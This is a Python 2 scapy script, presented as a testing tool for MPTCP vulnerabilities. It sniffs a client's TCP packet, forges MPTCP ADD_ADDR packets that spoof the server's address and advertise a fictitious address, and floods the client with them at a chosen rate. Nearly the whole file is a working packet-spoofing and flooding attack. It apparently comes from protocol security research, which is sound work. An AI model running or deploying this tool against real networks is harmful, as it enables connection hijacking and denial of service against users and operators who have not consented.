#Author: fabriziodemaria

import time
import logging
import threading
import sys
from random import randint
from sniff_script import *

logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)
from scapy.all import *
from scapy.layers.inet import TCP, IP, Neighbor
from scapy.layers import mptcp
from scapy.sendrecv import sr1
from netaddr import *

SEQUENCE_OFFSET = 1000 # TODO Analyze this value used to manipulate ACK/SEQ numbers for the connection
ADDRESS_ID = 6 # Any number that is not taken by the other subflows should work


def forge_addaddr(advertisedIP, srcIP, srcPort, dstIP, dstPort, sniffedSeq, sniffedAck):
    # Advertising fictious address, just to flood the receiver
    pkt = (Ether()/IP(version=4L,src=srcIP,dst=dstIP)/                            \
             TCP(sport=srcPort,dport=dstPort,flags="A",seq=sniffedSeq,ack=sniffedAck,\
                 options=[TCPOption_MP(mptcp=MPTCP_AddAddr(address_id=ADDRESS_ID,\
                                                           adv_addr=advertisedIP))]))
    return pkt


def filter_source(p, srcIP):
    if p.haslayer(TCP):
        str = p.sprintf("%IP.src%")
        if str == srcIP:
            return True
    return False



def parse_args():
    import argparse
    import itertools
    import sys

    parser = argparse.ArgumentParser(description='Testing tool for MPTCP vulnerabilities. Requires root privileges for scapy.')
    parser.add_argument('advertisedIP', action='store', help='Advertised IP address')
    parser.add_argument('serverIP', action='store', help='Server IP address')
    parser.add_argument('clientIP', action='store', help='Client IP address')
    parser.add_argument('serverIf', action='store', help='Interface name to server')
    parser.add_argument('clientIf', action='store', help='Interface name to client')
    parser.add_argument('floodRate', action='store', help='Send rate for the ADD_ADDR option')
    if len(sys.argv)!=7:
        parser.print_help()
        sys.exit(1)
    return parser.parse_args()


def main():
    args = parse_args()

    ADVERTISED_IP = args.advertisedIP
    CLIENT_IP = args.clientIP
    SERVER_IP = args.serverIP
    CLIENT_IF = args.clientIf
    SERVER_IF = args.serverIf

    pktl = sniff(iface=CLIENT_IF, lfilter=lambda p: filter_source(p, CLIENT_IP), count=1)

    fpktlist = []
    fpkt = forge_addaddr(ADVERTISED_IP, SERVER_IP, pktl[0][TCP].dport, CLIENT_IP, pktl[0][TCP].sport, (pktl[0][TCP].ack)+SEQUENCE_OFFSET, (pktl[0][TCP].seq)-SEQUENCE_OFFSET)

    print "Preparing"
    for i in range(0, 10000):
        fpktlist.append(fpkt.copy())
    start = time.time()
    print "Sending"
    for i in range(0,1):
        sendpfast(fpktlist, pps=int(args.floodRate), iface=CLIENT_IF, loop=100000, file_cache=True)
        # srploop(fpktlist,inter=0.0003,retry=2,timeout=4)
    end = time.time()
    print(end - start)
    return

if __name__ == "__main__":
    main()
